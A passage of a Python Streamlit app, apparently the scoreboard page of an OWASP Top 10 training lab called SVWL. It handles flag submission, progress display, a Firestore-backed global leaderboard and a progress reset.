            Submit flag dari modul mana saja, lihat progres, dan cek leaderboard global
        </p>
    </div>
    """, unsafe_allow_html=True)

    # ── Global flag submission ──────────────────────────────
    st.markdown("### 🎯 Submit Flag")
    col1, col2 = st.columns([3, 1])
    with col1:
        global_flag = st.text_input("Flag:", placeholder="SVWL{...}", key="global_flag")
    with col2:
        st.markdown("<br>", unsafe_allow_html=True)
        if st.button("Validasi", key="global_validate"):
            if st.session_state.current_user == "guest":
                st.warning("Login terlebih dahulu untuk menyimpan flag.")
            else:
                matched_module = next(
                    (m for m, v in FLAGS.items() if global_flag.strip() == v), None
                )
                if matched_module:
                    is_new = submit_flag_to_firestore(matched_module)
                    if is_new:
                        st.success(f"✅ Flag valid! Modul {matched_module} solved. +{FLAG_POINTS[matched_module]} poin!")
                        time.sleep(0.5)
                        st.rerun()
                    else:
                        st.info(f"Modul {matched_module} sudah pernah solved sebelumnya.")
                else:
                    st.error("❌ Flag tidak valid.")

    st.markdown("---")

    # ── Progress board user saat ini ───────────────────────
    st.markdown("### 📊 Progress Saya")
    total_pts = sum(FLAG_POINTS[k] for k in st.session_state.solved_flags)
    max_pts   = sum(FLAG_POINTS.values())
    pct_done  = int(total_pts / max_pts * 100) if max_pts else 0

    st.markdown(f"""
    <div style="background:#141d2e;border:1px solid #1e2d45;border-radius:4px;padding:1.2rem;margin-bottom:1rem;">
        <div style="display:flex;justify-content:space-between;margin-bottom:0.5rem;">
            <span style="font-family:var(--mono);color:#2979ff;font-size:1.3rem;font-weight:700;">
                {total_pts} / {max_pts} PTS
            </span>
            <span style="font-family:var(--mono);color:#90a4ae;font-size:0.9rem;">{pct_done}% Selesai</span>
        </div>
        <div style="background:#0a0e1a;border-radius:3px;height:8px;">
            <div style="background:linear-gradient(90deg,#2979ff,#d500f9);width:{pct_done}%;height:8px;border-radius:3px;transition:width 0.5s;"></div>
        </div>
    </div>
    """, unsafe_allow_html=True)

    for code, (name, icon, color) in OWASP_DESCRIPTIONS.items():
        solved      = code in st.session_state.solved_flags
        pts         = FLAG_POINTS[code]
        bg          = "#0d1a0d" if solved else "#141d2e"
        border_l    = "#00e676" if solved else "#1e2d45"
        status_icon = "✅" if solved else "⬜"
        pts_color   = "#00e676" if solved else "#37474f"
        st.markdown(f"""
        <div style="background:{bg};border:1px solid #1e2d45;border-left:3px solid {border_l};
                    border-radius:4px;padding:0.7rem 1rem;margin-bottom:0.4rem;
                    display:flex;justify-content:space-between;align-items:center;">
            <div style="display:flex;align-items:center;gap:0.7rem;">
                <span style="font-size:0.9rem;">{status_icon}</span>
                <span style="font-family:var(--mono);color:{color};font-weight:700;font-size:0.85rem;">{code}</span>
                <span style="font-family:var(--mono);color:#90a4ae;font-size:0.82rem;">{icon} {name}</span>
            </div>
            <span style="font-family:var(--mono);color:{pts_color};font-size:0.82rem;font-weight:600;">
                +{pts if solved else 0} / {pts} pts
            </span>
        </div>
        """, unsafe_allow_html=True)

    if len(st.session_state.solved_flags) == len(FLAGS):
        st.markdown("""
        <div style="background:linear-gradient(135deg,#0d1a0d,#0a1628);
                    border:2px solid #00e676;border-radius:8px;padding:2rem;text-align:center;margin-top:1rem;">
            <p style="font-size:2rem;margin:0;">🏆</p>
            <h2 style="font-family:var(--mono);color:#00e676;margin:0.5rem 0;">SEMUA FLAG DITEMUKAN!</h2>
            <p style="font-family:var(--mono);color:#90a4ae;margin:0;">
                Anda telah menyelesaikan semua modul OWASP Top 10 SVWL. Selamat!
            </p>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("---")

    # ── Global Leaderboard dari Firestore ──────────────────
    st.markdown("### 🏆 Leaderboard Global")

    try:
        col_refresh, _ = st.columns([1, 3])
        with col_refresh:
            refresh_lb = st.button("🔄 Refresh Leaderboard", key="refresh_lb")

        scoreboard_ref  = db.collection("scoreboard").order_by("score", direction=firestore.Query.DESCENDING).limit(15)
        scoreboard_docs = scoreboard_ref.stream()
        leaderboard     = [doc.to_dict() for doc in scoreboard_docs]

        if leaderboard:
            rank_icons = {1: "🥇", 2: "🥈", 3: "🥉"}
            for i, entry in enumerate(leaderboard, 1):
                username  = entry.get("username", "unknown")
                score     = entry.get("score", 0)
                flags_solved = len(entry.get("solved_flags", []))
                is_me     = username == st.session_state.current_user
                bg        = "#141d2e" if not is_me else "#0a1628"
                border    = "#2979ff" if is_me else "#1e2d45"
                rank_icon = rank_icons.get(i, f"#{i}")
                name_style = "color:#2979ff;font-weight:700;" if is_me else "color:#e8eaf6;"
                me_badge  = ' <span style="color:#2979ff;font-size:0.7rem;">[YOU]</span>' if is_me else ""

                st.markdown(f"""
                <div style="background:{bg};border:1px solid {border};border-radius:4px;
                            padding:0.65rem 1rem;margin-bottom:0.3rem;
                            display:flex;justify-content:space-between;align-items:center;">
                    <div style="display:flex;align-items:center;gap:0.8rem;">
                        <span style="font-family:var(--mono);font-size:0.9rem;color:#546e7a;min-width:2rem;">{rank_icon}</span>
                        <span style="font-family:var(--mono);font-size:0.88rem;{name_style}">{html.escape(username)}{me_badge}</span>
                    </div>
                    <div style="display:flex;gap:1.5rem;align-items:center;">
                        <span style="font-family:var(--mono);font-size:0.78rem;color:#546e7a;">{flags_solved}/{len(FLAGS)} flags</span>
                        <span style="font-family:var(--mono);font-size:0.9rem;color:#ffd600;font-weight:700;">{score} pts</span>
                    </div>
                </div>
                """, unsafe_allow_html=True)
        else:
            st.info("Belum ada data di leaderboard. Jadilah yang pertama!")
    except Exception as e:
        st.warning(f"Leaderboard tidak dapat dimuat: {e}")

    st.markdown("---")

    # ── Reset Progress ─────────────────────────────────────
    st.markdown("### ⚠️ Danger Zone")
    col_r1, col_r2 = st.columns([2, 1])
    with col_r1:
        st.markdown(
            '<p style="color:#546e7a;font-size:0.85rem;margin:0;">'
            'Reset akan menghapus semua progress di session ini DAN di Firestore. Tidak bisa di-undo!</p>',
            unsafe_allow_html=True,
        )
    with col_r2:
        if st.button("🗑️ Reset Semua Progress", key="reset_all"):
            # Hapus data dari Firestore
            try:
                db.collection("scoreboard").document(st.session_state.current_user).set({
                    "username":     st.session_state.current_user,
                    "score":        0,
                    "solved_flags": [],
                    "last_updated": firestore.SERVER_TIMESTAMP,
                })
            except Exception:
                pass
            # Bersihkan session state
            keys_to_clear = [
                "score", "solved_flags", "score_loaded",
                "xss_comments", "ssrf_log", "a09_blind_count",
                "secret_otp", "otp_attempts", "otp_locked",
                "session_token", "forged_token",
            ]
            for k in keys_to_clear:
                if k in st.session_state:
                    del st.session_state[k]
            st.success("Progress telah direset.")
            time.sleep(0.8)
            st.rerun()